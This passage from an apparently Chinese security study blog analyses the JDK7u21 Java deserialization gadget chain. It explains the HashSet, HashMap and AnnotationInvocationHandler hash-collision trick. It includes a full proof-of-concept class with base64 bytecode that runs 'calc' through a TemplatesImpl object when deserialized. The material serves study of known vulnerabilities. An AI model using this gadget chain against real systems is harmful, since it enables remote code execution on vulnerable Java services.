class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                    var6 = <span class="built_in">this</span>.cloneArray(var6);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> var6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="HashSet-readObject-和HashMap-put"><a href="#HashSet-readObject-和HashMap-put" class="headerlink" title="HashSet.readObject()和HashMap.put()"></a>HashSet.readObject()和HashMap.put()</h2><ol><li><p>又回到那会调用equals这里了，当然是想到map和set两个东西了，可能会在反序列化时重新建立内部顺序并进行比较</p></li><li><p>这里我们使用的是HashSet，观察到readObject()，然后再到put()</p><ol><li><code>HashMap.put()</code>这里调用了equals，这里触发equal的条件是e.hash &#x3D;&#x3D; hash并且是一个对象不是普通值，后者容易前者得碰撞，要求就是使得前后两个的hash值先相等</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HashSet.java</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in HashMap capacity and load factor and create backing HashMap</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">    <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">    map = (((HashSet)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in size</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HashMap.java</span></span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="hash-异或黑魔法-Magic-Number"><a href="#hash-异或黑魔法-Magic-Number" class="headerlink" title="hash()异或黑魔法: Magic Number"></a>hash()异或黑魔法: Magic Number</h2><ol><li><p>要触发一定有一个对象是Templates的proxy，这里调用hash后回到代理AnnotationInvocationHandler这里，有invoke()再到hashCodeImpl()</p><ol><li>可以看到获取的是this.memberValues.entrySet()，也就是代理的map，再对map里的东西进行异或求知，这里求出的hash要与另一个对象相同，问题来了：<strong>这里的Map中要有什么？</strong></li><li><strong>注意到</strong>: 当 memberValues 中只有一个key和一个value时，该哈希简化成 (127 * key.hashCode()) ^ value.hashCode()</li><li>又加上<strong>异或黑魔法</strong>: 0^x&#x3D;x，刚好可用，所以只要找到一个hashCode为0的key，就会有127<em>0&#x3D;0，*<em>另一个再填入相同的值就可以，但是这里要触发equals，所以HashSet要再放入一个恶意TemplatesImpl对象，proxy中的value要和它相同所以也是同一个TemplatesImpl对象了</em></em> –&gt; 无需得知TemplatesImpl的hashCode()，知道是同一个就ok</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">hashCodeImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    Map.Entry var3;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator(); var2.hasNext(); var1 += <span class="number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;</span><br><span class="line">        var3 = (Map.Entry)var2.next();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h2><ol><li>最大的问题其实是: HashMap中的键值要输入什么来绕过hash的比较，这里用到了jdk7u21中的特殊逻辑，这里见上面的黑魔法就ok了，解释的很清楚</li><li>最终流程<ol><li>proxy底层加上一个map，并设置AnnocationInvocationHandler的type为我们的恶意payloadTemplatesImpl，用于后续链子的触发 –&gt; AnnocationInvocationHandler.type是我们获取对象的方法的地方</li><li>HashSet中放入代理和恶意TemplatesImpl对象</li><li>代理的hashmap中放入<code>(magicNumber,payloadTemplatesImpl)</code>，用于hash碰撞</li><li><strong>这里的TemplatesImpl有两个作用，一个是用来碰撞，一个是用来触发恶意代码</strong></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JDKChain;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jdk7u21_p</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 1. 思路</span></span><br><span class="line"><span class="comment">     *      1. 构造Anno..Invoker，传入HashMap</span></span><br><span class="line"><span class="comment">     *      2. HashMap中插入两个hash碰撞的对象</span></span><br><span class="line"><span class="comment">     *      3. 经典反序列化就ok了</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 构造TemplatesImpl对象 * * * * * */</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">payloadObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            setFieldValue(payloadObj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;Base64.decode(</span><br><span class="line">                    <span class="string">&quot;yv66vgAAADMAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zv&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;cm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20v&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;ZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;YWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;SXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUGF5bG9hZC5q&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;YXZhDAAJAAoHACEMACIAIwEABGNhbGMMACQAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACYACgEA&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;FFRlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;L3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxh&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;bi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAK&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;Z2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9T&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMA&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;AQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAM&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;AAAAGgAGAAAACgAEAAwADQAPABAADQARAA4AFQAQAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAA&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;EQACAAsAAAAZAAAAAwAAAAGxAAAAAQAMAAAABgABAAAAFgASAAAABAABABMAAQAQABQAAgALAAAA&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;GQAAAAQAAAABsQAAAAEADAAAAAYAAQAAABsAEgAAAAQAAQATAAEAFQAAAAIAFg==&quot;</span>)&#125;);</span><br><span class="line">            setFieldValue(payloadObj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="comment">// hashMap.put(&quot;f5a5a608&quot;,&quot;foo&quot;);   // 可以也又也可以没有</span></span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)  construct.newInstance(Templates.class, hashMap);</span><br><span class="line">            <span class="comment">// InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, hashMap);</span></span><br><span class="line">            <span class="comment">// setFieldValue(handler,&quot;type&quot;, Templates.class);</span></span><br><span class="line">            <span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(jdk7u21_p.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">            <span class="type">HashSet</span> <span class="variable">evil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line">            <span class="comment">// HashSet evil = new HashSet(); // 二者都可行，因为LinkedHashSet只比HashSet多了一个方法，最终还是向上调用</span></span><br><span class="line">            evil.add(payloadObj);</span><br><span class="line">            evil.add(proxy);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 为了防止再构造时就触发，选择先evil.add(proxy)然后再hashMap.put()</span></span><br><span class="line">            hashMap.put(<span class="string">&quot;f5a5a608&quot;</span>, payloadObj);    <span class="comment">// f5a5a608使得key*127=0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 模拟序列化与反序列化 * * * * * */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 序列化</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(evil);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h3 id="Q-equalsImpl-中调用函数没有权限或者执行失败怎么办-为什么一定会执行到想要的newTransformer呢？-待debug验证"><a href="#Q-equalsImpl-中调用函数没有权限或者执行失败怎么办-为什么一定会执行到想要的newTransformer呢？-待debug验证" class="headerlink" title="Q: equalsImpl()中调用函数没有权限或者执行失败怎么办?为什么一定会执行到想要的newTransformer呢？(待debug验证)"></a>Q: equalsImpl()中调用函数没有权限或者执行失败怎么办?为什么一定会执行到想要的newTransformer呢？(待debug验证)</h3><ol><li><strong>Q1: 权限问题</strong><ol><li>不怕，因为在getMemberMethods这个地方把所有方法都<code>setAccessable(true)</code>了</li></ol></li><li><strong>Q2: 调用失败</strong>(未调试确认)<ol><li><p>这里调用的是被代理对象的，在这里payload应该是TemplatesImpl对象</p></li><li><p>观察到这里的调用语句是<code>var8 = var5.invoke(var1);</code>，只是调用<strong>无参函数</strong>，观察TemplatesImpl里的无参，在这里都不会产生异常</p></li><li><p>这里甚至<strong>有可能直接调用defineTransletClasses()</strong></p></li><li><p><strong>Q3: 那这里为什么不会调用多次呢？</strong></p><ol><li><del>A3: 我的猜测是这里因为InvocationTargetException(当通过反射调用的方法抛出异常时抛出)时捕获直接返回false了，而调用calc时按照之前的情况也是会报错，这里直接在调用到时返回false</del></li><li><del>而有几次发现运行poc后并没有弹出calc可能是在某个地方中断了，</del>getDeclaredMethods 方法返回的是一个包含所有声明方法的数组，但这些方法的顺序是不确定的</li><li>A3: 检查讲错了这里(如果情况是TemplatesImpl全部方法其实也可以那样理解)，但是这里的type是Templates.class<ol><li>可以看到只有两个方法，这就是我们要进行调用的目</li><li>调用一个后错误就会返回false了，这里InvocationTargetException只是返回false</li></ol></li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Templates</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    Transformer <span class="title function_">newTransformer</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    Properties <span class="title function_">getOutputProperties</span><span class="params">()</span>;</span><br><span class="line">&#125;      </span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="Q-两个Templates-class各自的含义，A2处深入讲解了动态代理"><a href="#Q-两个Templates-class各自的含义，A2处深入讲解了动态代理" class="headerlink" title="*Q: 两个Templates.class各自的含义，A2处深入讲解了动态代理"></a>*Q: 两个Templates.class各自的含义，A2处深入讲解了动态代理</h3><blockquote><p>这里也算是深入了解一下<code>InvocationHandler</code>，<code>AnnotationInvocationHandler</code>和动态代理<code>Proxy.newProxyInstance()</code>，然后才是重点!!!</p></blockquote><ol><li><p>先看一下InvocationHandler，是一个接口，只有invoke方法</p><ol><li>Object proxy：这是代理对象本身，即通过 Proxy.newProxyInstance 创建的代理实例</li><li>Method method：这是代理对象上调用的方法。</li><li>Object[] args：这是传递给方法调用的参数数组</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>AnnotationInvocationHandler 是 java.lang.reflect 包中的一个内部类</p><ol><li>简单说下功能<ol><li>处理注解方法调用：当通过反射调用注解的方法时，AnnotationInvocationHandler 负责返回注解成员的值。</li><li>存储注解成员值(<strong>Map的含义</strong>)：AnnotationInvocationHandler 内部维护一个 Map，用于存储注解成员的名称和对应的值</li></ol></li><li>第一个参数 Class&lt;? extends Annotation&gt; var1 表示注解的类型，第二个参数就是上面提到的map</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    <span class="built_in">this</span>.type = var1;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Proxy.newProxyInstance(…)</p><ol><li>ClassLoader loader：指定新代理类的类加载器。通常使用目标接口的类加载器。</li><li>Class&lt;?&gt;[] interfaces：指定新代理类实现的接口列表。</li><li>InvocationHandler h：指定处理代理对象方法调用的 InvocationHandler 实现。</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span></span><br></pre></td></tr></table></figure></li><li><p>大致再过一遍后，现在再来进行理解，首先记住，<strong>这两个Templates.class之间是没有直接关系的</strong></p><ol><li>第一个Templates.class: <code>InvocationHandler handler = (InvocationHandler)  construct.newInstance(Templates.class, hashMap);</code><ol><li>A: 这里是使用反射直接设置type为Templates.class来绕过类型检查，setAccessible(true) 方法允许你访问私有构造方法，并且 newInstance 方法在创建对象时不会进行严格的类型检查，<strong>其实往大的情况说: 反射机制允许你在运行时动态地创建对象，而不会进行编译时的类型检查</strong><ol><li>因此，即使 Templates.class 不是注解类，反射机制仍然允许你创建 AnnotationInvocationHandler 的实例。</li></ol></li><li><strong>并非万能绕过</strong><ol><li>反射机制确实可以在一定程度上绕过编译时的类型检查，但它并不能完全忽略类型系统的约束</li><li>防范方法：运行时类型检查</li></ol></li></ol></li><li>第二个Templates.class: <code>Templates proxy = (Templates) Proxy.newProxyInstance(jdk7u21_p.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, handler);</code><ol><li>A: 这里是提供Proxy对象对外的接口，这里是哪一种对象其实都无所谓，就算改造成<code>Object proxy = (Object) Proxy.newProxyInstance(jdk7u21_p.class.getClassLoader(), new Class[]&#123;Retention.class&#125;, handler);</code>这样用Object和Retention.class也没关系</li><li><strong>Q: 那么为什么无关呢？动态代理本质是什么？</strong><ol><li><strong>A: 原则与本质用几句话来回答(很关键的几句)</strong><ol><li>动态代理并不是像p牛所说的代理所有方法，而是仅代理接口中的方法和Object类中的<code>hashCode()</code>，<code>equals(Object obj)</code>，<code>toString()</code>，其他在代理对象上调用不属于接口的方法，这些方法将不会被代理</li><li>并不是所有的 Object 类方法都会被代理。以下方法通常不会被代理：<code>getClass()</code>，<code>notify()</code>，<code>notifyAll()</code>，<code>wait()</code></li><li>Proxy.newProxyInstance()返回对象的本质: 一个实现了指定接口的代理对象。这个对象实际上是 java.lang.reflect.Proxy 类的一个实例，并且它实现了我们在调用 Proxy.newProxyInstance 方法时传入的接口<ol><li>可以通过调试看到结构，可以知道就是一个proxy的实例对象<img src="/pic/Java%E5%AE%89%E5%85%A85(10)_jdk7u21/newProxyInstance%E8%BF%94%E5%9B%9E%E5%80%BC.png" alt="结构"></li><li>但是实现了传入的接口，可以是<code>Interface proxy_instance</code>也可以是<code>Obejct proxy_instance</code></li></ol></li></ol></li><li>这里再讲讲为什么无关: 因为这里并没有用到接口的特殊方法，proxyInstance这里的关键作用在于调用equals到invoke()里</li></ol></li></ol></li></ol></li></ol><h2 id="利用条件与修复"><a href="#利用条件与修复" class="headerlink" title="利用条件与修复"></a>利用条件与修复</h2><blockquote><p>这个利用链俗名是JDK7u21，可以认为它可以在7u21及以前的版本中使用</p></blockquote><ol><li><em><strong>Q: 这个利用链是否影响JDK6和JDK8，具体影响哪些小版本?</strong></em><ol><li>A: Java的版本是多个分支同时开发的，并不意味着JDK7的所有东西都一定比JDK6新，所以，当看到这个利用链适配7u21的时候，我们不能先入为主地认为JDK6一定都受影响。</li><li>Oracle JDK6一共发布了30多个公开的版本，最后一个公开版本是6u45，在2013年发布。此后，Oracle公司就不再发布免费的更新了，但是付费用户仍然可以获得Java 6的更新，最新的Java 